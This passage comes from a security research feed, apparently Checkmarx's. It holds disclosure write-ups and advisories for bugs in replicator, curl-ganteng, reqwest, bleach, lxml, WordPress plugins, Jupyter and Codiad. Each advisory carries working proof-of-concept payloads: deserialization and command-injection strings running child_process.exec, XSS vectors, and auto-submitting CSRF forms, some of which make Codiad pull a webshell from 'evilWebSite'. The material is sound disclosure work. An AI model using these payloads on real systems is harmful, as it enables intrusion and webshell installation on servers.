When serializing, on the other hand, there is a validation using the list \"TYPED_ARRAY_CTORS\" defined earlier.\n\n<img src=\"/img/blogs/replicator/Image-4.png\" style=\"height: 30%;width: 30%;\"/>\n\nLooking at the code shown before we can invoke \"new\" on every function under the GLOBAL object with our own parameters. Something like this:\n\n<img src=\"/img/blogs/replicator/Image-5.png\" style=\"width: 50%;\"/>\n\nFrom here, there are limitations that we need to bypass in order to achieve the code execution.\n\n1. From the \"fromSerializable\" function check, the \"ctorName\" must be a name of a function.\n2. The function must be a constructor.\n    * Hence, we can’t just call \"Eval\" because it’s not a constructor.\n\n<img src=\"/img/blogs/replicator/Image-6.png\" style=\"width: 70%;\"/>\n\n3. Must be a direct descendent of the GLOBAL object.\n    * It’s impossible to call a function like \"child_process.exec(‘evilcode’)\" because we control only the value inside the brackets\n\n<img src=\"/img/blogs/replicator/image-7.jpg\" style=\"width: 100%;\"/>\n\n4. Must be a valid JSON.\n    * As mentioned before, Replicator wraps around JSON parse and stringify. Due to that, the input string given to the decode function gets \"JSON.parse\" before going into the problematic \"fromSerializable\" function. So, calling \"setImmediate\" / \"setInterval\" / \"setTimeout\" isn’t possible because it requires a callback function as an input and that isn’t JSON valid.\n\n<img src=\"/img/blogs/replicator/Image-9.png\" style=\"width: 100%;\"/>\n\nThe following payload will fail at JSON.parse before invoking a new setTimeout:\n\n<img src=\"/img/blogs/replicator/Image-10.png\" style=\"width: 100%;\"/>\n\nThere is a way to pass a string (which is a JSON valid input) that will be converted to JavaScript code. Using a new \"Function\" will create an anonymous function with our payload, but it will not get executed.\n\n<img src=\"/img/blogs/replicator/Image-11.png\" style=\"width: 70%;\"/>\n\nAt this point, it looks like we cannot go further, but there are still some security concerns and vulnerabilities despite the limitations:\n\n* Calling an arbitrary function created by the application using replicator, which heavily depends on the application and the specific situation, something like:\n\n<img src=\"/img/blogs/replicator/Image-12.png\" style=\"width: 50%;\"/>\n\n* Local file inclusion using \"require\" could lead to other vulnerabilities, such as: XSS, RCE, sensitive information disclosure, and more. This, as well, depends on the attack scenario.\n\n<img src=\"/img/blogs/replicator/Image-13.png\" style=\"width: 50%;\"/>\n\n* Etc...\n\nAfter fuzzing and some more research, we asked ourselves what happens if we serialize a ***Set*** within a ***Set***. What would that look like? Is it done recursively?\n\n<img src=\"/img/blogs/replicator/Image-14.png\" style=\"width: 100%;\"/>\n\nWhen understanding that the serialization/deserialization is done recursively, the payload to an RCE was around the corner. As mentioned before, we can create a new \"Function\", but nothing will run it, and we can call \"setTimeout,\" but have to give it a function to execute.\n\nCombining these two, here is the final payload to trigger code execution:\n\n```js\nreplicator.decode('[{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"setTimeout\",\"arr\":​{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"Function\",\"arr\":\" process.mainModule.require(\\'child_process\\').exec(\\'calc\\');\"}}​}}]')\n```\n\n<img src=\"/img/blogs/replicator/Image-15.png\" style=\"width: 100%;\"/>\n\nThe inner object will create a function with the code input as a string, and the other object, \"setTimeout\", receives the function as an argument and runs the code.\n\nDepends on the scope of the program, the shell exploit code could change. For example, in the picture above, the payload was: `require(\\'child_process\\').exec(\\'calc\\')` without `process.mainModule` because it was run in a REPL console.\n\n# Recommendations\nTo avoid issues like this, update the npm Replicator package to version 1.0.4 or later.\n\n# Summary of Disclosure and Events\nAfter discovering and validating the vulnerabilities, we notified npm of our findings and worked with them throughout the remediation process until they informed us the issues were appropriately patched. NPM's responsiveness and professionalism throughout the process are commendable.\n\n# Timeline of Disclosure\n| Date    | Action |\n| -------- | ------- |\n| March 24, 2021 | Vulnerability was reported responsibly |\n| March 24, 2021 | Checkmarx SCA customers using npm and Replicator were warned and provided mitigation guidance, * without exposing the technical details of the findings |\n| May 14, 2021 | Pull request to fix the issue was created |\n| May 17, 2021 | Fixed version 1.0.4 was released on NPM |\n| May 17, 2021 | Advisory with the full details was published on the Checkmarx advisory website |\n| December 15, 2022 | CVE-2021-33420 published |\n\n# Final Words\nDiscovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.\n\nSolutions like [Checkmarx SCA](https://checkmarx.com/product/cxsca-open-source-scanning/?) are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.\n\n# References\n* [Issue](https://github.com/inikulin/replicator/issues/16)\n* [Pull request](https://github.com/inikulin/replicator/pull/17)\n* [Fixing Commit](https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b)\n* [Advisory](https://advisory.checkmarx.net/advisory/CX-2021-4787)","tags":["deserialization","rce","npm"]},{"title":"Deserialization RCE attack in replicator","url":"/2021/05/16/Deserialization RCE attack in replicator/","content":"## Summary\nAffected versions of replicator npm package are vulnerable to a deserialization RCE via the TypedArrays objects. replicator doesn't verify the object type given when deserializing TypedArrays and thus letting an attacker create arbitrary objects.\n\n## Product\nreplicator before 1.0.4.\n\n## Impact\nIn case an untrusted data get deserialized, an attacker could achieve RCE.\n\n## Steps to reproduce\n```\nreplicator.decode('[{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"setTimeout\",\"arr\":​{\"@t\":\"[[TypedArray]]\",\"data\":{\"ctorName\":\"Function\",\"arr\":\"process.mainModule.require(\\'child_process\\').exec(\\'calc\\');\"}}​}}]')\n```\n\n### Expected result:\nThe command in the exec function will be run, in this case aimed for a Windows machine a calculator will pop up.\n\n## Remediation\nUpdate replicator dependency to 1.0.4 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Pull request](https://github.com/inikulin/replicator/pull/17)\n2. [Issue](https://github.com/inikulin/replicator/issues/16)\n3. [Commit](https://github.com/inikulin/replicator/commit/2c626242fb4a118855262c64b5731b2ce98e521b)\n4. [Blog](https://checkmarx.com/blog/npm-replicator-remote-code-execution-deserialization)\n","tags":["deserialization","rce","npm"]},{"title":"Command injection vulnerability in curl-ganteng","url":"/2021/04/25/Command injection vulnerability in curl-ganteng/","content":"## Summary\nAffected versions of `curl-ganteng` npm package are vulnerable to command injection vulnerability in the `curl` function.\n\n## Product\nAll versions of curl-ganteng npm package.\n\n## Impact\nThis issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.\n\n## Steps to reproduce\nRun the following PoC:\n\n```js\nvar curl = require('curl-ganteng')\ncurl.curl(\"google.com' `mkdir pwnd`'\").catch((a) => {console.log(a)}).then((a) => {console.log(a)})\n```\n\n### Expected result:\nA new folder named ‘pwnd’ will be created.\n\n## Remediation\nCurrently there is no fix version released. As a workaround, avoid passing untrusted input into the vulnerable parameters when using the library.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [curl-gateng npm package](https://www.npmjs.com/package/curl-ganteng)\n","tags":["rce","node","nodejs","javascript","npm"]},{"title":"Remote code execution vulnerability in reqwest","url":"/2021/04/25/Remote code execution vulnerability in reqwest/","content":"## Summary\nAffected versions of `reqwest` npm package are vulnerable to remote code execution vulnerability when requesting a malicious URL.\n\n## Product\nAll versions of reqwest npm package.\n\n## Impact\nThis issue may lead to remote code execution if the URL fetched is untrusted input.\n\n## Steps to reproduce\n1. Run the following server:\n\n```py\nfrom flask import Flask, Response\napp = Flask(__name__)\n \n \n@app.route('/')\ndef hello():\n    resp = Response(\"Foo bar baz\")\n    resp.data = 'require(\"child_process\").exec(\"calc\")'\n    resp.headers[\"Content-Type\"] = \"javascript\"\n    return resp\n    \n \nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5555, debug=True)\n```\n\n2. Make a get request to the server:\n\n```js\nvar reqwest = require('reqwest')\nreqwest({\n    url: 'http://localhost:5555/'\n  , method: 'get'\n  , success: function (resp) {\n      qwery('#content').html(resp)\n    }\n})\n```\n\n### Expected result:\nA calculator will pop up on the server.\n\n## Remediation\nCurrently there is no fix version released.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [reqwest npm repository](https://www.npmjs.com/package/reqwest)\n","tags":["rce","node","nodejs","javascript","npm"]},{"title":"Hostname spoofing in url-parse","url":"/2021/02/17/Hostname spoofing in url-parse/","content":"## Summary\nAffected versions of url-parse mishandles certain uses of backslash such as `http:\\/` and interprets the URI as a relative path.\nBrowsers accept backslashes after the protocol, and treat it as a normal slash, while url-parse sees it as a relative path. \nThe vulnerability fix was pushed to 1.5.0 but caused other problems, version 1.5.1 is the recommended update.\n\n## Product\nurl-parse before 1.5.0.\n\n## Impact\nDepending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.\n\n## Steps to reproduce\n```\nvar Url = require('url-parse');\nnew Url('https:\\\\/github.com/foo/bar');\n```\n\n### Expected result:\nthe url would be relative without a hostname:\n```\n{\n  slashes: false,\n  protocol: 'https:',\n  hash: '',\n  query: '',\n  pathname: '//github.com/foo/bar',\n  auth: '',\n  host: '',\n  port: '',\n  hostname: '',\n  password: '',\n  username: '',\n  origin: 'null',\n  href: 'https://github.com/foo/bar'\n}\n```\n\n## Remediation\nUpdate url-parse dependency to 1.5.1 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [d1e7e88](https://github.com/unshiftio/url-parse/commit/d1e7e8822f26e8a49794b757123b51386325b2b0)\n2. [Pull request](https://github.com/unshiftio/url-parse/pull/197)\n3. [Security notes](https://github.com/unshiftio/url-parse/blob/master/SECURITY.md#history)\n","tags":["javascript","npm","improper validation","spoofing"]},{"title":"Hostname spoofing in urijs","url":"/2021/02/12/Hostname spoofing in urijs/","content":"## Summary\nAffected versions of urijs fails to validate the hostname correctly when using backslash in the protocol e.g. `http:\\/`.\nBrowsers accept backslashes after the protocol, and treat it as a normal slash, while urijs sees it as a relative path.\n\n## Product\nurijs before 1.19.6.\n\n## Impact\nDepending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.\n\n## Steps to reproduce\n```\nvar URI = require('urijs');\nURI('http:/\\www.google.com');\n```\n\n### Expected result:\nthe url would be relative without a hostname:\n```\nURI { \n  _string: '', \n  _parts: { \n    protocol: 'http', \n    username: null, \n    password: null, \n    hostname: null, \n    urn: true, \n    port: null, \n    path: '/www.google.com', \n    query: null, \n    fragment: null, \n    preventInvalidHostname: false, \n    duplicateQueryParameters: false, \n    escapeQuerySpace: true \n  }, \n  _deferred_build: true \n} \n```\n\n## Remediation\nUpdate urijs dependency to 1.19.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [a1ad8bc](https://github.com/medialize/URI.js/commit/a1ad8bcbc39a4d136d7e252e76e957f3ece70839)\n2. [Release note](https://github.com/medialize/URI.js/releases/tag/v1.19.6)\n3. [Advisory](https://github.com/medialize/URI.js/security/advisories/GHSA-p6j9-7xhc-rhwp)\n","tags":["javascript","npm","improper validation","spoofing"]},{"title":"Denial of Service in get-ip-range package","url":"/2021/02/09/Denial of Service in get-ip-range package/","content":"## Summary\nAffected versions of get-ip-range are vulnerable to denial of service in case the ip-range is an untrusted input. An attacker could send a large range of IPs e.g. '192.168.1.1/0' and result in a JavaScript heap out of memory crash.\n\n## Product\nget-ip-range before 4.0.0.\n\n## Impact\nCrashing a program that passes user input to get-ip-range.\n\n## Steps to reproduce\n```\nimport { getIPRange } from 'get-ip-range';\ngetIPRange('192.168.1.1/0');\n```\n\n### Expected result:\n```JavaScript heap out of memory``` crash.\n\n## Remediation\nUpdate get-ip-range dependency to 4.0.0 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [98ca22b](https://github.com/JoeScho/get-ip-range/commit/98ca22b815c77273cbab259811ab0976118e13b6)\n","tags":["javascript","dos","denial of service"]},{"title":"Mutation XSS in Mozilla-bleach using comments","url":"/2021/01/31/Mutation XSS in Mozilla-bleach using comments/","content":"## Summary\nAffected versions of Mozilla-bleach are vulnerable to Mutation XSS (mXSS) vulnerability when calling bleach.clean with:\n* `svg` or `math` allowed \n* `p` or `br` allowed\n* one of the RCDATA tags allowed:\n```\nscript\nnoscript\nstyle\nnoframes\nxmp\nnoembed\niframe\n```\n* and the argument `strip_comments=False`\n\n\n## Product\nBleach before 3.3.0.\n\n## Impact\nAccording to GitHub, more than 72,000 repositories are dependent on Bleach. Among them are major vendors, including multiple Fortune 500 tech companies.\n\n## Steps to reproduce\n```\n>>> import bleach\n>>> bleach.clean('<math></p><style><!--</style><img src/onerror=alert(1)>', tags=['math', 'p', 'style'], strip_comments=False)\n```\n\n### Expected result:\n```<math><p></p><style><!--</style><img src/onerror=alert(1)>--></style></math>```\n\n## Remediation\nUpdate bleach dependency to 3.3.0 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-vv2x-vrpj-qqpq)\n2. Commit [79b7a3c](https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13)\n","tags":["xss","mxss","bypass","python","mozilla"]},{"title":"CSRF in Elementor-Contact-Form-DB wordpress plugin","url":"/2021/01/13/CSRF in Elementor-Contact-Form-DB wordpress plugin/","content":"## Summary\nAffected versions of the \"Elementor Contact Form DB\" plugin for WordPress are vulnerable to a Cross-Site Request Forgery (CSRF) attack.\n\n## Product\nElementor Contact Form DB Wordpress plugin before 1.6\n\n## Impact\nAn admins that visits a malicious site could change The Elementor-Contact-Form-DB setting without his/her knowledge.\n\n## Steps to reproduce\n1. Wordpress with vulnerable Elementor Contact Form DB plugin installed\n2. Admin visits the page: \n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[site-url]/wp-admin/edit.php?post_type=elementor_cf_db&page=sb_elem_cfd_settings\" method=\"POST\">\n        <input type=\"number\" name=\"sb_elem_cfd[disable_admin_nag]\" value=\"1\" />\n        <input type=\"text\" name=\"sb_elem_cfd[records_min_role]\" value=\"lfb_role\" />\n        <input type=\"text\" name=\"sb_elem_cfd_save\" value=\"Save Settings\" />\n<button>submit</button>\n</form>\n\n```\n\n\n### Expected result:\nAdmin setting page will change according to the attacker's input.\n\n## Remediation\nUpdate Elementor-Contact-Form-DB to 1.6 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2454670)\n","tags":["wordpress","csrf"]},{"title":"RCE via site-offline wordpress plugin","url":"/2020/12/22/RCE via site-offline wordpress plugin/","content":"## Summary\nThe site-offline WordPress plugin before version 1.4.4 was vulnerable to Cross-site Request Forgery (CSRF) and Cross-Site Scripting (XSS) attacks.\n\n## Product\nSite-offline wordpress plugin before version 1.4.4\n\n## Impact\nSubject to WordPress and server configurations, successful exploitation of the Cross-Site Scripting vulnerability may lead to remote code execution.\n\n## Steps to reproduce\n1. Setup a WordPress website with the Site Offline plugin installed and activated.\n2. Admin visits the page \n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://local-wp/wp-admin/admin.php?page=sahu_site_offline_wp\" method=\"POST\">\n<input type=\"text\" name=\"action_dashboard\" value=\"sahu_sop_dashboard\"/>\n<input type=\"number\" name=\"sahu_so_status\" value='1' />\n<input type=\"text\" name=\"so_headline\" value=\"\" onfocus='alert(1)'\" />\n<input type=\"text\" name=\"so_description\" value=\"<img src=x onerror=alert(1)>\" />\n<input type=\"number\" name=\"display_logo\" value='0' />\n<input type=\"text\" name=\"so_logo_ur\" value=\"\">\n<button>submit</button>\n</form>\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nAn alert should be shown on the target WordPress admin panel.\n\n## Remediation\nUpdate Site-offline plugin to 1.4.4 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2445009/)\n2. [Site Offline WordPress Plugin](https://wordpress.org/plugins/site-offline/)\n","tags":["rce","xss","wordpress","csrf","webshell"]},{"title":"Open redirect in Jupyter server","url":"/2020/12/16/Open redirect in Jupyter server/","content":"## Summary\nThe Jupyter Server provides the backend (i.e. the core services, APIs, and REST endpoints) for Jupyter web applications like Jupyter notebook, JupyterLab, and Voila. Affected versions of Jupyter Server are vulnerable to open redirect vulnerability. All jupyter servers running without a base_url prefix are technically affected, however, these maliciously crafted links can only be reasonably made for known jupyter server hosts.\n\n## Product\nJupyter Server before version 1.1.1\n\n## Impact\nA link to a jupyter server may appear safe, but ultimately redirect to a malicious site.\n\n## Steps to reproduce\n1. Run a jupyter server on port 1111\n2. Navigate to ```http://localhost:1111/login?next=//example.com```\n\n### Expected result:\n`https://example.com` will load.\n\n## Remediation\nUse on of the two options:\n1. Update jupyter_server package to 1.1.1 or above.\n2. Run your server on a url prefix: \"jupyter server --ServerApp.base_url=/jupyter/\".\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-9f66-54xg-pc2c)\n2. Commit [85e4abc](https://github.com/jupyter-server/jupyter_server/commit/85e4abccf6ea9321d29153f73b0bd72ccb3a6bca)\n","tags":["python","open redirect"]},{"title":"CSRF in ultimate-category-excluder wordpress plugin","url":"/2020/12/07/CSRF in ultimate-category-excluder wordpress plugin/","content":"## Summary\nAffected versions of the ultimate-category-excluder WordPress plugin are vulnerable to a Cross-Site Request Forgery (CSRF) attack in the page `ultimate-category-excluder.php`.\n\n## Product\nultimate-category-excluder wordpress plugin before 1.2\n\n## Impact\nAn admins that visits a malicious site could change The ultimate-category-excluder setting without his/her knowledge.\n\n## Steps to reproduce\n1. Wordpress with vulnerable ultimate-category-excluder plugin installed\n2. Admin visits the page:\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[wordpress_url]/wp-admin/options-general.php?page=ultimate-category-excluder.php\" method=\"POST\">\n<input type=\"text\" name=\"exclude_main[]\" value=\"-1\" />\n<input type=\"text\" name=\"exclude_feed[]\" value=\"-1\" />\n<input type=\"text\" name=\"exclude_search[]\" value=\"-1\" />\n<input type=\"number\" name=\"exclude_archives[]\" value='-1' />\n<input type=\"text\" name=\"ksuce\" value=\"true\" />\n<button>submit</button>\n</form>\n\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n\n### Expected result:\nAdmin setting page will change according to the attacker's input.\n\n## Remediation\nUpdate ultimate-category-excluder to 1.2 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Changeset](https://plugins.trac.wordpress.org/changeset/2434070)\n","tags":["wordpress","csrf"]},{"title":"Mutation Cross-Site Scripting in lxml","url":"/2020/11/26/Mutation Cross-Site Scripting in lxml/","content":"## Summary\nThe lxml python package is vulnerable to mXSS due to the use of improper parser. The parser used doesn't imitate browsers, which causes different behaviors between the sanitizer and the user's page. This can result in an arbitrary HTML/JS code execution.\n\n## Product\nlxml from 1.2 up to 4.6.1\n\n## Impact\nUsing lxml as a sanitizer might not fulfill its purpose. \n\n## Steps to reproduce\n```\n>>> from lxml.html.clean import clean_html\n>>> clean_html('<svg><style><img src=x onerror=alert(1)></style></svg>')\n>>> clean_html('<noscript><style><a title=\"</noscript><img src=x onerror=alert(1)>\">')\n```\n\n### Expected result:\n```<svg><style><img src=x onerror=alert(1)></style></svg>```\nAnd\n```<noscript><style><a title=\"</noscript><img src=x onerror=alert(1)>\"></style></noscript>```\n\n## Remediation\nUpdate lxml dependency to 4.6.2 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Advisory](https://github.com/advisories/GHSA-pgww-xf46-h92r)\n2. Initial commit [89e7aad](https://github.com/lxml/lxml/commit/89e7aad6e7ff9ecd88678ff25f885988b1)\n3. Additional commit [a105ab8](https://github.com/lxml/lxml/commit/a105ab8dc262ec6735977c25c13f0bdfcdec72a7)\n","tags":["xss","mxss","bypass","python"]},{"title":"Reintroduced ReDoS in debug","url":"/2020/11/17/Reintroduced ReDoS in debug/","content":"## Summary\nThe debug module is vulnerable to regular expression denial of service when untrusted user input is passed into the `o` formatter. It takes around 50k characters to block for 2 seconds making this a low severity issue. This vulnerability is a reintroduction of CVE-2017-16137 in version 3.2.0.\n\n## Product\ndebug before 4.3.1.\n\n## Impact\nThe impact of this vulnerability is considered low due to the low severity of the issue.\n\n## Remediation\nUpdate the debug dependency to 4.3.1 or above.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://www.twitter.com/ynizry).\n\n## Resources\n1. Commit [b6d12fd](https://github.com/visionmedia/debug/commit/b6d12fdbc63b483e5c969da33ea6adc09946b5ac)\n2. [Issue](https://github.com/visionmedia/debug/issues/797)\n","tags":["javascript","npm","redos"]},{"title":"Codiad CSRF in the plugin request","url":"/2020/08/19/Codiad CSRF in the plugin request/","content":"## Summary\nA Cross Side Request Forgery (CSRF) vulnerability was found in Codiad. The request to download a plugin from the marketplace is only available to admin users and it isn’t CSRF protected. This might cause admins to make a vulnerable request without them knowing and result in an RCE.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nAn malicious link sent to the an admin can result in a webshell on the server.\n\n## Steps to reproduce\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[Codiad-url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=\" method=\"GET\">\n<button>submit</button>\n</form>\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nA webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["rce","csrf","php","webshell"]},{"title":"Codiad SSRF when installing a plugin","url":"/2020/08/19/Codiad SSRF when installing a plugin/","content":"## Summary\nA Server-Side Request Forgery (SSRF) vulnerability was found in Codiad. A user with admin privileges could use the plugin install feature to make the server request any URL. This could potentially result in an RCE. Combined with other vulnerabilities, an unauthenticated attacker can manipulate the admin to exploit this vulnerability without their knowledge.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nMalicious files could be downloaded to the server.\n\n## Steps to reproduce\n1. Login to codiad then visit the page:\n```\n<html><head></head>\n<body>\n<form style=\"opacity: 0;\" action=\"http://[codiad_url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=\" method=\"GET\">\n<button>submit</button>\n</form>\n\n<script>document.querySelector('form').submit();</script>\n</body></html>\n```\n\n### Expected result:\nA webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["rce","php","webshell","ssrf"]},{"title":"Stored XSS via folder name in Codiad","url":"/2020/08/19/Stored XSS via folder name in Codiad/","content":"## Summary\nA Cross Site Scripting (XSS) vulnerability was found in Codiad. The vulnerability occurs due to improper sanitization of the folder’s name, the `$path` variable in `components/filemanager/class.filemanager.php`.\n\n## Product\nCodiad from v1.7.8.\n\n## Impact\nAn attacker could run arbitrary Javascript code on the users, chaining this vulnerability with another one, an RCE vulnerability could be achieved.\n\n## Steps to reproduce\n1. Login to codiad\n2. Create a folder and name it with html element\n3. The following example running on an admin will result in a webshell:```<img width=1 height=1 src=components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=>```\n\n### Expected result:\nThe html element is running when viewing the folder name.\n\n## Remediation\nThere is no fixed version of Codiad.\n\n## Credit\nThis issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).\n\n## Resources\n1. [Issue](https://github.com/Codiad/Codiad/issues/1122)\n","tags":["rce","xss","php","webshell"]},{"title":"Mutation Cross-Site Scripting (mXSS) Vulnerabilities Discovered in Mozilla-Bleach","url":"/2020/07/07/Mutation Cross-Site Scripting (mXSS) Vulnerabilities Discovered in Mozilla-Bleach/","content":"# Introduction\nAs part of the beta testing phase that took place earlier this year for our recently launched Software Composition Analysis solution, [CxSCA](https://www.checkmarx.com/product/cxsca-open-source-scanning/?), the Checkmarx Security Research Team investigated Mozilla-Bleach, finding multiple concerning security vulnerabilities. Patches were released in mid-March 2020, with Checkmarx CxSCA customers using Bleach receiving notice of the issues in advance. Given that the patches have been in-market for some time, giving Bleach users sufficient time to update their software versions, we’re now publishing the full technical report and [proof-of-concept](https://youtu.be/cJZg3qj7sz0) video for educational purposes.\n\n# Overview\nAccording to documentation, “Bleach is an allowed-list-based HTML sanitizing library that escapes or strips markup and attributes and is intended for sanitizing text from untrusted sources.” In simpler terms, Bleach is a very user-friendly HTML sanitizer, and its main purpose is to disallow arbitrary tags to run (e.g., JavaScript (JS) tags and attributes to prevent cross-site scripting (XSS)). After a bit of fuzzing and using some different approaches, Checkmarx researchers discovered the possibility that a mutation XSS (mXSS) vulnerability may exist. With further digging, these suspicions were confirmed, and several mXSS vulnerabilities were discovered in the Mozilla-Bleach python package. An attacker abusing these vulnerabilities would have the ability to execute an arbitrary JavaScript code on the user end, via various sites or projects that use Bleach.\n\n\n# Mutation XSS (mXSS)\nA mXSS vulnerability occurs when there is incoherent parsing between the client and the sanitizer. To understand this better, the following example should help. Let’s see how a standard browser interprets invalid HTML. When we enter the data below into the innerHTML of the page:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-1.png\" style=\"width: 100%;\"/>\n\nThe browser will modify the data to make it valid html. In this case, this is what the output looks like:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-2.png\" style=\"width: 100%;\"/>\n\nNow let’s try to change the **div** tag to a different type of tag, for example:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-3.png\" style=\"width: 100%;\"/>\n\nDoing so will generate the result below:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-4.png\" style=\"width: 100%;\"/>\n\nBoth examples act differently because the data inside the tags are parsed differently according to the tag type. Now, imagine the parser goes from left to right. In the first case, after entering the ***div*** tag, the parser stays as html and opens an ***a*** tag with the title attribute (because the “closing” ***div*** tag is text in an attribute, it will not close the tag). In the second case, when the parser enters the ***style*** tag, it changes to CSS parser, which means no ***a*** tag is created, and the ***style*** tag will be closed where the attribute was supposed to be. So, how can this information help us in finding vulnerabilities? Imagine a tag that parses differently in different cases, for example, the ***noscript*** tag. The trick here is that the ***noscript*** tag in HTML is treated differently, whether JavaScript (JS) is enabled or disabled. When JS is enabled, the data inside the tag is parsed as JS. But, when it’s disabled, the data is parsed as html. In nearly all cases, JS is enabled in browsers. Let’s take a look at how the following input is being interpreted with, and without, JS enabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-5.png\" style=\"width: 100%;\"/>\n\nHere, JS is disabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-6.png\" style=\"width: 100%;\"/>\n\nHere, JS is enabled:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-7.png\" style=\"width: 100%;\"/>\n\n# Vulnerability: CVE-2020-6802\n\nWhen we tried to pass the above input to Bleach, it sanitized the '***<***' characters in the attribute, but also it closed the ***a*** tag! This means that it parsed the data in ***noscript*** as html.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-8.png\" style=\"width: 100%;\"/>\n\nIn this case, the only thing left is to avoid this sanitization. If that wasn’t enough of a challenge, we attempted to enter another parsing into the equation.\n\n<img src=\"/img/blogs/mozilla-bleach/Image-9.png\" style=\"width: 100%;\"/>\n\nThis provided the outcome we were anticipating. **Sanitizer view**: Enters ***noscript*** and the parser is **HTML**, opens a ***style*** tag, and starts parsing as CSS (or raw text). Everything after the ***style*** tag isn’t parsed as html, so from the sanitizer’s viewpoint, there is no closing ***noscript*** tag nor ***img*** tag. **Browser view**: Enters ***noscript*** and the parser is changed to JavaScript. Now the ***\"&lt;style>\"*** is just text, not a tag. As you can see, the closing tag, in this case, actually closes the ***noscript*** tag, and from there, everything is html. The conditions to successful exploitation are: ***noscript*** tag allowed as well as html comments, or one of the following tags: ***title, textarea, script, style, noembed, noframes, iframe, xmp***.\n\n# Vulnerability: CVE-2020-6816\n\nShortly after, the Checkmarx Security Research Team discovered another mXSS vulnerability in Mozilla-Bleach, this time with the use of ***svg/math*** tags. The caveat here is that the parsing inside those tags is like XML. So, if we enter, for example, a ***style*** tag, the data inside will act differently, whether inside or outside. Inside an ***svg*** tag:\n\n<img src=\"/img/blogs/mozilla-bleach/Image-10.png\" style=\"width: 40%;\"/>\n\nWithout an 